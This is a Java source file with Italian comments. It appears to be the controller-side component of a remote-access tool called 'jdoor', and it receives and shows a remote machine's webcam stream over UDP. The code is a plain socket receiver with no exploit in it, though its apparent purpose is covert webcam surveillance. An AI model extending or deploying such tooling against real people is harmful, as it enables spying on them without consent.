package com.jdoor.client;

import com.jdoor.Constants;
import com.jdoor.client.view.StreamView;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;

/**
 * Thread per la ricezione della webcam.
 */
public class ClientWebcamView extends Thread{
    private final DatagramSocket socketWebcamView;
    private StreamView streamWebcamView;
    private final ClientCommander commander;

    /**
     * Costruttore del Thread.
     * @param port La port su cui bisogna ascoltare.
     * @param commander Il ClientCommander.
     * @throws SocketException Se non si riesce ad aprire il socket UDP sulla porta specificata.
     */
    public ClientWebcamView(int port, ClientCommander commander) throws SocketException {
        socketWebcamView = new DatagramSocket(port);
        this.commander = commander;
    }

    public void setScreenView(StreamView streamView) {
        this.streamWebcamView = streamView;
    }

    /**
     * Metodo per capire se si è giunti alla fine dell'immagine.
     * @param data Il frame UDP ricevuto.
     * @return true se il frame è {'E', 'N', 'D'} o falso se no.
     */
    private boolean isImageEnded(byte[] data) {
        if (data == null)
            return false;

        return data[0] == 'E' && data[1] == 'N' && data[2] == 'D';
    }

    /**
     * Metodo di esecuzione principale del Thread.
     */
    @Override
    public void run() {
        while (commander.getSocketCommands() != null) {
            try {
                byte[] data = new byte[Constants.IMAGE_BYTES_DIMENSION];
                ByteArrayOutputStream finalImage = new ByteArrayOutputStream();


                while (!isImageEnded(data)) {
                    DatagramPacket pkt = new DatagramPacket(data, Constants.IMAGE_BYTES_DIMENSION);
                    socketWebcamView.receive(pkt);
                    finalImage.write(pkt.getData());
                }

                streamWebcamView.setScreen(finalImage.toByteArray());
            } catch (IOException e) {
                streamWebcamView.getGraphics().drawString("STREAM PROBLEMS", 0, 0);
            }
        }
        System.out.println("chiusura\n");
        socketWebcamView.close();
    }
}
